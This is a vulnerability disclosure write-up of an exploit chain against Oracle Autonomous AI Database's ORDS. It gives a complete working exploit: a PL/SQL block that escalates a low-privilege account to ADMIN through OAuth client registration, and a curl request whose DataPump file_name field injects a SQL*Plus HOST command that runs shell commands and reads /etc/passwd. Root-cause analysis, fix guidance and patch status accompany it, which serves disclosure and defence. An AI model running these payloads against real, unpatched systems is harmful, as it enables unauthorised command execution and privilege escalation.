# Oracle Autonomous AI Database — OS command execution as `oracle` via ORDS DataPump `file_name` → SQLcl `HOST`

## TL;DR

**Asset:** Oracle Autonomous AI Database (ADB-Free), image
`container-registry.oracle.com/database/adb-free:latest-26ai`
(digest `sha256:e7368ed9…`), **ADBS-26.2.4.2-26ai**, DB engine 23.0.0.0,
ORDS 25.4.0.364.1739. Pwn2Own target ("Oracle Autonomous AI DB", $40k).

**Impact:** A single authenticated HTTPS request to the ORDS REST Data-API
DataPump endpoint runs an **arbitrary OS command as `uid=1001(oracle)`** —
*outside* the PL/SQL VM, *outside* the PDB, and *outside* the ADB `OLTP`
lockdown sandbox (`OS_ACCESS=DISABLE`). The command runs in the ORDS/Jetty
JVM process, so every in-database lockdown control is bypassed.

**Entry point:** the public, advertised low-privilege `MINIMAL` account (the
default account ZDI issues to a contestant: `CONNECT, RESOURCE` only). A
separate ORDS OAuth defect lifts `MINIMAL` → `ADMIN` first, so the full
network-only chain is **MINIMAL → ADMIN → OS RCE as `oracle`**.

**Primitive class:** ORDS renders attacker input raw into a dynamic-SQL
"tash" script and runs it through `oracle.dbtools.common.util.SQLScripts`,
which spins up a **SQLcl `ScriptRunner` whose `RunnerRestrictedLevel` defaults
to `NONE`**. That leaves the SQL\*Plus `HOST` / `!` / `$` commands enabled;
they dispatch to `HostAliasCommand` → `new ProcessBuilder("bash","-c", …)`
inside the server JVM.

**Chain size:** 5 SQL calls + 3 HTTP calls, well under the P2O 10-minute cap.
Verified live on a pristine, brand-new vendor-image container
(`adb-free-fresh`) on 2026-05-03.

**Status:** Reported to ZDI/Oracle ~11 May 2026. **Fixed in the ORDS 26.2.x
line** — confirmed in ORDS 26.2.1 (adb-free `26.7.4.1-26ai`, July 2026) and
almost certainly already in ORDS 26.2.0 (the out-of-band CSPU of 29 May 2026),
i.e. ~2–3 weeks after submission — see
[§ Fix / patch status](#6-fix--patch-status). Both legs are ORDS-bound, not
DB-engine-bound. The chain still reproduces on the version pinned above (the
version that was live at submission time). No public CVE appears to match this
specific chain.

---

## 1. Target model and constraints

Oracle Autonomous AI Database Free ships the full Autonomous DB stack in a
container: the 23ai DB engine, ORDS (Oracle REST Data Services) on Jetty, APEX,
and the Mongo/GraphQL API bridges. The network attack surface from a contestant
laptop is:

| Service | Port |
| --- | --- |
| SQL\*Net (TCPS) | 1521 / 1522 |
| ORDS HTTPS (Jetty) | 8443 |
| Mongo API | 27017 |

The security model that has to be defeated:

- **`pdb_lockdown = OLTP`** — the Autonomous lockdown profile. Among other
  things it sets **`OS_ACCESS=DISABLE`**, which kills every "the database
  invokes a binary" path from inside the PDB: `EXTPROC`, `DBMS_SCHEDULER`
  `EXECUTABLE` jobs, external-table `PREPROCESSOR`, `DBMS_JAVA`, etc. (all
  re-confirmed dead empirically).
- **SQL Firewall + ADB privilege analysis** apply to in-PDB SQL.
- The PL/SQL VM runs as the `oracle` OS user but the lockdown blocks it from
  reaching the OS.

The interesting consequence: **the OS-exec sink used here is not in the
database at all.** It is in the *ORDS JVM*, a separate process that also runs
as `oracle` (uid 1001) and is *not* governed by `pdb_lockdown`. So the bug
sidesteps the entire Autonomous lockdown design rather than fighting it.

Entry credential is `MINIMAL` — the public default account issued to
contestants, holding only `CONNECT` and `RESOURCE`.

---

## 2. The RCE bug — ORDS DataPump `file_name` → SQLcl `HOST` injection

This is the "latest HOST RCE" (the `ADMIN → oracle` step). Everything below is
reachable with an `ADMIN`-context REST token.

### 2.1 The sink

ORDS re-uses a **SQLcl** helper on the server side to render and execute its
dynamic-SQL templates:

```
DataPumpServlet.runScript(String script)                     // ords-db-api-25.4.0:247
  → SQLScripts.execute(this.conn, script)                    // ords-common-25.4.0:24-37
      → new ScriptRunner(...)                                // SQLcl ScriptRunner
          ScriptRunnerContext.getRestrictedLevel() == NONE   // ScriptRunnerContext:334
          RunnerRestrictedLevel.NONE never restricts          // RunnerRestrictedLevel:28-30
      → for each ISQLCommand from ScriptParser:
          'host' / 'hos' / 'ho' / '!' / '$'                  // SQLStatementTypes.java:23-24,218-220
            → G_S_HOST(ALIAS) → HostAliasCommand              // CommandRegistry.java:643-644
              → HostAliasCommand.handleEvent()                // dbtools-common-25.4.1:81-98
```

`HostAliasCommand.handleEvent()` is the money shot:

```java
cmdTokens.add("bash");
cmdTokens.add("-c");
cmdTokens.add("...; " + addPath + command + "; ...");   // 'command' = attacker text
ProcessBuilder builder = new ProcessBuilder(cmdTokens);
process = builder.start();                                // runs as JVM uid = oracle(1001)
```

`SQLScripts.execute` is a **SQLcl client-side script runner re-used inside the
ORDS server JVM**. In that context SQL\*Plus `HOST` is effectively a
server-side "shell out". ORDS never sets the runner's restriction level, so it
stays at the state default `NONE` and `HOST` is fully live.

### 2.2 Getting attacker bytes into the script

The DataPump export template renders the request's `file_name` field **raw**,
via a Mustache **triple-brace** (no HTML/SQL escaping), inside a single-quoted
SQL literal:

```
# datapump_export.tash:25
   ...
   filename => '{{{fileName}}}'
   ...
```

Triple-brace = no escaping on either side, so a `file_name` value can close the
literal and the statement and inject new SQL / SQL\*Plus commands.

The only validator, `DataPumpServlet.reviewFileName` (`ords-db-api-25.4.0:387`),
**only runs when `credential_name` is supplied.** The plain
EXPORT-without-credential path leaves `file_name` completely unvalidated.

### 2.3 Breakout payload

We are rendered inside `filename => '<HERE>'`. We need to close the quote and
the PL/SQL block, then issue a fresh SQL\*Plus `HOST`, then comment out the
trailing template text:

```
PWN.DMP'); END;
/
HOST id > /tmp/pwn ; whoami >> /tmp/pwn ; uname -a >> /tmp/pwn
--
```

- `PWN.DMP')` — a plausible filename, then close the argument list.
- `; END;` + newline + `/` — terminate and run the anonymous block.
- `HOST …` — a standalone SQL\*Plus command; the `ScriptParser` recognises it
  and dispatches to `HostAliasCommand`.
- `--` — comment out whatever the template appended after `{{{fileName}}}`.

Newlines matter: SQL\*Plus `HOST` is a line-oriented command, so the payload
is genuinely multi-line (not `;`-chained on one line). This is why `H3` in the
sink hunt (roles field) failed — it couldn't inject a newline.

### 2.4 Why `ADMIN` is allowed to call it

`DataPumpServlet.service()` (`:161`) requires the `SQL Administrator` role.
`ADMIN` gets it for free:

- `ADMIN` holds **`PDB_DBA`**, the default DBA role in a PDB.
- `JDBCSchemaChecker.principal()` (`ords-db-common:179-186`) **auto-adds the
  `SQL Administrator` role** whenever `ordsEnabled == true && hasDBARole ==
  true`.
- ADB-Free auto-enables `ADMIN` as an ORDS schema at boot
  (`ords_metadata.user_ords_schemas`, pattern `admin`).

So no file credential, no ORDS user creation, no extra grants — an `ADMIN`
Basic-auth (or Bearer) request is admitted straight through.

### 2.5 Single request

```bash
PAYLOAD="PWN.DMP'); END;
/
HOST id > /tmp/pwn ; whoami >> /tmp/pwn ; uname -a >> /tmp/pwn ; cat /etc/passwd | head -3 >> /tmp/pwn
--"

BODY=$(jq -Rn --arg fn "$PAYLOAD" '{operation:"EXPORT", job_mode:"FULL", file_name:$fn}')

curl -sk -u "ADMIN:$ADMIN_PASS" \
  -H 'Content-Type: application/json' \
  -X POST 'https://<host>:8443/ords/admin/_/db-api/stable/database/datapump/export' \
  -d "$BODY"
# → HTTP 201; /tmp/pwn contains: uid=1001(oracle) gid=1001(oinstall) ...
```

Note the JSON keys are **snake_case** (`job_mode`, `file_name`). ORDS's Jackson
mapping declares `@JsonProperty` in snake_case, so camelCase keys are silently
dropped.

**Result:** arbitrary command execution as `uid=1001(oracle)`, in the ORDS
JVM, outside the PDB and outside the `OLTP` lockdown sandbox.

---

## 3. The prerequisite — `MINIMAL → ADMIN` (ORDS OAuth `_ADMIN` gate defect)

The RCE above needs `ADMIN`. ZDI issues only `MINIMAL`. This ORDS OAuth defect
bridges the gap without touching a password.

### 3.1 The defect

`ORDS_METADATA.ORDS_SECURITY_ADMIN` is `AUTHID DEFINER` (executes as
`ORDS_METADATA`) and is **`PUBLIC EXECUTE`**. Its caller-privilege gate is the
local `CHECK_SCHEMA`, which calls
`ORDS_SECURITY_INTERNAL.CHECK_SCHEMA_ADMIN`. That `_ADMIN` variant runs only:

- `CHECK_DEV_LOCKED`
- `CHECK_SCHEMA_NAME` — a 3-entry blacklist (`ORDS_PUBLIC_USER`,
  `APEX_PUBLIC_USER`, caller's own schema)

It **does not call `HAS_ADMIN_PRIV`.** The non-`_ADMIN` sibling
`CHECK_SCHEMA` *does*. So the `_ADMIN`-suffixed entry point — the one whose
name implies it is the *more* privileged variant — is the one missing the admin
check. `ADMIN` isn't on the blacklist and is REST-enabled, so `MINIMAL` can
freely register OAuth clients *against the `ADMIN` schema*.

### 3.2 The 5 SQL calls (as `MINIMAL`, over SQL\*Net)

```sql
DECLARE
  ck   ORDS_METADATA.ORDS_TYPES.T_CLIENT_KEY;
  cred ORDS_METADATA.ORDS_TYPES.T_CLIENT_CREDENTIALS;
BEGIN
  -- 1) register an OAuth client bound to the ADMIN schema
  ORDS_METADATA.ORDS_SECURITY_ADMIN.REGISTER_CLIENT(
    P_SCHEMA        => 'ADMIN',
    P_NAME          => 'PWN',
    P_GRANT_TYPE    => 'client_credentials',
    P_SUPPORT_EMAIL => 'x@example.com',
    P_DESCRIPTION   => 'pwn');

  -- 2,3) grant it the roles that unlock the SDW /_/sql endpoint
  ORDS_METADATA.ORDS_SECURITY_ADMIN.GRANT_CLIENT_ROLE(
    P_SCHEMA=>'ADMIN', P_CLIENT_NAME=>'PWN', P_ROLE_NAME=>'SQL Developer');
  ORDS_METADATA.ORDS_SECURITY_ADMIN.GRANT_CLIENT_ROLE(
    P_SCHEMA=>'ADMIN', P_CLIENT_NAME=>'PWN', P_ROLE_NAME=>'Schema Administrator');

  -- 4,5) rotate to capture client_id + PLAINTEXT secret
  ck.NAME := 'PWN';
  cred := ORDS_METADATA.ORDS_SECURITY_ADMIN.ROTATE_CLIENT_SECRET(
    P_SCHEMA => 'ADMIN', P_CLIENT_KEY => ck, P_REVOKE_EXISTING => TRUE);
  DBMS_OUTPUT.PUT_LINE('CID='  || cred.CLIENT_KEY.CLIENT_ID);
  DBMS_OUTPUT.PUT_LINE('CSEC=' || cred.CLIENT_SECRET.SECRET);
  COMMIT;
END;
/
```

### 3.3 The 2 HTTP calls → `ADMIN`-context SQL

```bash
TOKEN=$(curl -sk -X POST "https://<host>:8443/ords/admin/oauth/token" \
  -u "$CID:$CSEC" -d "grant_type=client_credentials" | jq -r .access_token)

curl -sk -X POST "https://<host>:8443/ords/admin/_/sql" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/sql" \
  --data-binary "select user from dual;"
# → "ADMIN"
```

The SDW `/_/sql` endpoint does `openProxySession(PROXY_USER_NAME => ADMIN)`,
switching the pooled JDBC connection from `ORDS_PUBLIC_USER2` (which holds
`CONNECT THROUGH ADMIN` by default in ADB) to `ADMIN`. No password is read,
guessed, or brute-forced — the token is minted for an attacker-registered
client.

This isn't strictly needed for OS-RCE — once you have `ADMIN`-context SQL you
already have a DBA — but the same Bearer token authenticates the DataPump
request in §2, so the whole thing is one continuous network chain.

---

## 4. Full chain, end to end

```
MINIMAL (CONNECT, RESOURCE)
  │  5 SQL calls: REGISTER_CLIENT + 2× GRANT_CLIENT_ROLE + ROTATE_CLIENT_SECRET   [§3.2]
  ▼
attacker OAuth client bound to ADMIN schema  (client_id + plaintext secret)
  │  POST /ords/admin/oauth/token   (client_credentials)                          [§3.3]
  ▼
ADMIN-context Bearer token
  │  POST /ords/admin/_/db-api/stable/database/datapump/export
  │    file_name = "PWN.DMP'); END;\n/\nHOST <cmd>\n--"                            [§2.5]
  ▼
bash -c "<cmd>" as uid=1001(oracle), in the ORDS JVM,
  outside the PDB and outside the OLTP lockdown sandbox
```

Total: **5 SQL + 3 HTTP = 8 network calls**, comfortably inside the P2O
10-minute window. Verified live on the pristine vendor-image container
`adb-free-fresh` on 2026-05-03: the marker file showed
`uid=1001(oracle) gid=1001(oinstall)`, full `/etc/passwd` readable, arbitrary
command execution.

---

## 5. Root cause and fix guidance

Two independent design mistakes, one per stage:

1. **`RunnerRestrictedLevel` defaults to `NONE` in a server context.** SQLcl's
   `ScriptRunner` is a *client* tool where `HOST` is a legitimate convenience.
   ORDS re-uses it server-side (`SQLScripts.execute`) without ever raising the
   restriction level, so SQL\*Plus `HOST`/`!`/`$` become a server-side
   `ProcessBuilder`. The single-point fix is to set
   `RunnerRestrictedLevel = CLOUD` (or `R4` + an `allowedCommand` allow-list
   that excludes `G_S_HOST`) on the `ScriptRunnerContext` — that closes *every*
   `SQLScripts.execute` consumer at once.

2. **Raw `{{{fileName}}}` + validator gated on `credential_name`.** The
   template should use an escaped binding and/or the validator must run on the
   no-credential path too.

Sibling sinks in the same class (from the internal sink hunt):
`grep -rn "SQLScripts.execute(" <decompiled ORDS jars>`. Notably the
OpenServiceBroker clone-PDB `keystore_password` field flows through the same
helper without a surrounding-quote fight.

---

## 6. Fix / patch status

Reported to ZDI/Oracle ~11 May 2026. **Both legs of the chain live in ORDS**
(Java jars + `ORDS_METADATA` PL/SQL), not in the DB engine — so the fix is
ORDS-version-bound. Upgrading ORDS to the 26.2.x line alone kills the whole
chain; the incidental DB bump (`23.0.0.0 → 23.26.3.1.0`) is irrelevant to it.

### 6.1 adb-free image release history

The `adb-free:latest-26ai` tag is a rolling pointer; the underlying builds are
versioned `YY.M.p.b` (the **second digit is the release month**), which
reconciles with the GitHub container registry's publish dates:

| adb-free build | ~Released | ORDS | DB engine | This chain |
| --- | --- | --- | --- | --- |
| `26.2.4.2-26ai` | Feb 2026 (was `latest` at the ~May pull) | 25.4.0 | 23.0.0.0 | **VULNERABLE** — verified live (re-fired 2026-09-14) |
| `26.5.4.2-26ai` | May 2026 | *untested* | *untested* | **UNKNOWN** — the fixed-in boundary (see §6.3) |
| `26.7.4.1-26ai` | July 2026 (current `latest`) | 26.2.1.190.1402 (jars 2026-07-09) | 23.26.3.1.0 | **PATCHED** — verified live + jar decompile |

At submission time the rolling `latest-26ai` still resolved to the Feb
`26.2.4.2` image (digest `e7368ed9…`), which is what was reproduced against.

### 6.2 ORDS release timeline (the actual fix vehicle)

- **ORDS 26.1.0** — 13 Apr 2026. Still vulnerable.
- **ORDS 26.2.0** — out-of-band, shipped in the **CSPU of 29 May 2026**, forced
  by the unrelated CVSS-10 KEV bug **CVE‑2026‑46840** (Oracle guidance:
  *"upgrade to 26.2 or later"*). ⚠️ **Most likely the version this chain was
  first fixed in** — CVE‑2026‑46840 is itself "command execution under the ORDS
  process user," so its emergency remediation was a shell-out/deserialization
  sink lockdown, exactly the class the `SQLScripts` HOST fix belongs to. *Not
  directly confirmed.*
- **ORDS 26.2.1** — ~July 2026 (jars dated 2026-07-09), bundled in adb-free
  `26.7.4.1-26ai`. **Confirmed** to contain both fixes.

The two fixes (verified present in ORDS 26.2.1):

- **MINIMAL→ADMIN:** `ORDS_METADATA.ORDS_SECURITY_ADMIN` lost its `PUBLIC
  EXECUTE`; it is now gated to `ORDS_ADMINISTRATOR_ROLE`.
- **ADMIN→OS-RCE:** `DataPumpServlet.reviewFileName` → `escapeSqlLiteral` now
  doubles quotes on all paths and filter expressions are escaped; **and**, more
  importantly, `SQLScripts.execute` / `executeWithResponse` now run SQLcl at
  `RunnerRestrictedLevel.R4` with an `allowedCommand` allow-list that excludes
  `G_S_HOST` — killing the whole `SQLScripts` HOST sink class centrally
  (including the OpenServiceBroker `keystore_password` sibling and the `/_/sql`
  endpoint).

### 6.3 Confirmed vs. open

- **Confirmed:** vulnerable at ORDS 25.4.0 (`26.2.4.2-26ai`); fixed at ORDS
  26.2.1 (`26.7.4.1-26ai`).
- **Open boundary:** ORDS 26.2.0 / the `26.5.4.2-26ai` (May) image is untested —
  that is the exact "fixed-in" line. If it bundles ORDS 26.2.0 the chain is
  already dead there; if it still bundles 26.1.0/25.4.0 it is live. Pending a
  pull + decompile of that image to pin it definitively.

### 6.4 Not CVE‑2026‑46840

This chain is **distinct** from **CVE‑2026‑46840** (ORDS Core/BaaS
unauthenticated Jackson-deserialization RCE, CVSS 10.0, in the CISA KEV
catalog). That bug is unauthenticated and lives in the endpoint router; this one
requires an authenticated privileged (`SQL Administrator`/DBA) principal and
lives in the DataPump servlet + `SQLScripts` sink. No public CVE appears to
match this specific DataPump→SQLcl `HOST` chain, nor the `ORDS_SECURITY_ADMIN`
`_ADMIN`-gate priv-esc — both look uncredited, plausibly folded silently into
the 26.2.x hardening sweep. (The July 2026 CPU CVE list could not be fetched to
rule out a quiet assignment; worth a manual check of `cpujul2026.html` before
publishing.)

The chain **still reproduces on the pinned version documented at the top of
this write-up** (the version that was live at submission time): ADBS-26.2.4.2,
DB 23.0.0.0, ORDS 25.4.0, image `e7368ed9…`.

---

## 7. Timeline

- **2026-05-03** — `MINIMAL → ADMIN → OS RCE as oracle(uid 1001)` verified live
  end-to-end on a pristine vendor-image container (adb-free `26.2.4.2-26ai`,
  ORDS 25.4.0).
- **~2026-05-11** — reported to ZDI (Pwn2Own, Oracle Autonomous AI DB, $40k).
  No substantive response since.
- **2026-05-29** — Oracle ships ORDS 26.2.0 out-of-band (CSPU) for the unrelated
  CVSS-10 CVE‑2026‑46840. **Most likely where this chain was silently fixed**
  (unconfirmed).
- **2026-07-09** — ORDS 26.2.1 jars built (bundled in adb-free `26.7.4.1-26ai`,
  July 2026); both fixes confirmed present.
- **2026-09-14** — confirmed fixed on the current rolling `latest-26ai`
  (`26.7.4.1-26ai`, ORDS 26.2.1 / DB 23.26.3.1.0); still reproduces on the
  pinned ~May image.

## 8. Disclosure note

This is now an **n-day, not a 0-day** — patched on the current `latest`, and
likely patched since late May 2026, so there is no live-target leverage and
public disclosure is low-risk to users. The value of a write-up is establishing
independent discovery of a distinct sink class (a SQLcl `ScriptRunner` re-used
server-side at `RunnerRestrictedLevel.NONE`) plus the `ORDS_SECURITY_ADMIN`
`_ADMIN`-gate priv-esc — neither of which appears to carry a public CVE or
credit. Given the vendor track went cold after the May report, a public write-up
is the main way to get the finding on record.
